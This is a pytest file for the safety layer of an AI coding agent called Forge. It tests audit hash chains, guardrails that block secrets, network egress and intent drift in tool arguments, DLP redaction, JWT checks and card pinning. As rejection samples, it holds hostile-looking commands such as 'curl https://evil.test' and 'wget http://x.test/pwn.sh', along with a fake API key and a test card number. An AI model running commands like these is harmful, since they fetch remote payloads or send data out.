from pathlib import Path

import pytest

from agents.tool_guardrails import ToolInputGuardrailData
from app.a2a.pin import CardPinError, pin_or_verify
from app.a2a.token import issue_a2a_token, verify_a2a_authorization
from app.services.dlp import assert_no_egress, assert_safe_to_persist, redact_text, regex_scan
from app.services.guardrails import block_egress_in_args, block_intent_drift, block_secrets_in_args
from app.services.safety import SafetyError
from app.services.tool_audit import GENESIS, chain_hash, payload_for_hash, verify_chain
from app.tools import ForgeContext, all_tools


class _FakeToolCtx:
    def __init__(self, tool_name: str, arguments: str, intent: str = ""):
        self.tool_name = tool_name
        self.tool_arguments = arguments
        self.context = ForgeContext(
            session_id="s1",
            workspace=Path("."),
            mode="build",
            original_intent=intent,
        )


class _FakeAgent:
    name = "Forge"


def test_hash_chain_detects_tamper():
    p1 = payload_for_hash(
        session_id="s",
        tool_name="read_file",
        tool_call_id="c1",
        agent_name="Forge",
        arguments='{"path":"bugs.py"}',
        output="",
        actor="alice",
        state="start",
        decision="",
    )
    h1 = chain_hash(GENESIS, p1)
    p2 = payload_for_hash(
        session_id="s",
        tool_name="read_file",
        tool_call_id="c1",
        agent_name="Forge",
        arguments='{"path":"bugs.py"}',
        output="ok",
        actor="alice",
        state="end",
        decision="",
    )
    h2 = chain_hash(h1, p2)

    class R:
        def __init__(self, **kw):
            self.__dict__.update(kw)

    good = [
        R(session_id="s", tool_name="read_file", tool_call_id="c1", agent_name="Forge",
          arguments='{"path":"bugs.py"}', output="", actor="alice", state="start",
          decision="", prev_hash=GENESIS, hash=h1),
        R(session_id="s", tool_name="read_file", tool_call_id="c1", agent_name="Forge",
          arguments='{"path":"bugs.py"}', output="ok", actor="alice", state="end",
          decision="", prev_hash=h1, hash=h2),
    ]
    assert verify_chain(good)
    good[1].output = "tampered"
    assert not verify_chain(good)


def test_mutating_tools_have_input_guardrails():
    names = {getattr(t, "name", "") for t in all_tools()}
    assert "write_file" in names
    write = next(t for t in all_tools() if getattr(t, "name", "") == "write_file")
    rails = write.tool_input_guardrails or []
    assert any(getattr(r, "get_name", lambda: "")() == "block_secrets_in_args" for r in rails)
    read = next(t for t in all_tools() if getattr(t, "name", "") == "read_file")
    out_rails = read.tool_output_guardrails or []
    assert any(getattr(r, "get_name", lambda: "")() == "redact_tool_output" for r in out_rails)


def test_guardrail_blocks_secret_in_args():
    data = ToolInputGuardrailData(
        context=_FakeToolCtx("write_file", '{"content":"sk-abcdefghijklmnopqrstuvwxyz012345"}'),
        agent=_FakeAgent(),
    )
    out = block_secrets_in_args.guardrail_function(data)
    assert out.behavior["type"] == "reject_content"


def test_guardrail_blocks_curl():
    data = ToolInputGuardrailData(
        context=_FakeToolCtx("bash", '{"command":"curl https://evil.test"}'),
        agent=_FakeAgent(),
    )
    out = block_egress_in_args.guardrail_function(data)
    assert out.behavior["type"] == "reject_content"


def test_guardrail_blocks_inspect_drift():
    data = ToolInputGuardrailData(
        context=_FakeToolCtx(
            "a2a_roomcheck",
            '{"skill":"inspect","room_no":"1221"}',
            intent="请热修 order-api 的 bugs.py",
        ),
        agent=_FakeAgent(),
    )
    out = block_intent_drift.guardrail_function(data)
    assert out.behavior["type"] == "reject_content"


def test_dlp_blocks_openai_key_and_luhn_card():
    with pytest.raises(SafetyError, match="敏感"):
        assert_safe_to_persist("token sk-abcdefghijklmnopqrstuvwxyz012345", where="write_file")
    with pytest.raises(SafetyError, match="敏感"):
        assert_safe_to_persist("card 4111 1111 1111 1111", where="write_file")
    assert_safe_to_persist("def add(a, b): return a + b\n", where="write_file")
    assert_no_egress("ls -la")
    with pytest.raises(SafetyError, match="外发"):
        assert_no_egress("wget http://x.test/pwn.sh")


def test_redact_replaces_secret():
    text = redact_text("key=sk-abcdefghijklmnopqrstuvwxyz012345")
    assert "sk-abcdefghijklmnopqrstuvwxyz012345" not in text
    assert "[SECRET]" in text


def test_regex_scan_does_not_treat_code_secret_var_as_block():
    result = regex_scan("secret = os.environ.get('X')")
    assert "password_assign" not in result.blocked


def test_jwt_roundtrip_and_reject_garbage():
    token = issue_a2a_token("forge")
    assert verify_a2a_authorization(f"Bearer {token}")
    assert not verify_a2a_authorization("Bearer not-a-jwt")
    assert verify_a2a_authorization("Bearer forge-roomcheck-a2a")  # legacy default on


def test_card_pin_mismatch(tmp_path, monkeypatch):
    import app.a2a.pin as pin

    monkeypatch.setattr(pin, "PIN_DIR", tmp_path)
    pin_or_verify("http://127.0.0.1:8791", b'{"name":"RoomCheck"}')
    with pytest.raises(CardPinError):
        pin_or_verify("http://127.0.0.1:8791", b'{"name":"Evil"}')
    pin_or_verify("http://127.0.0.1:8791", b'{"name":"RoomCheck"}')
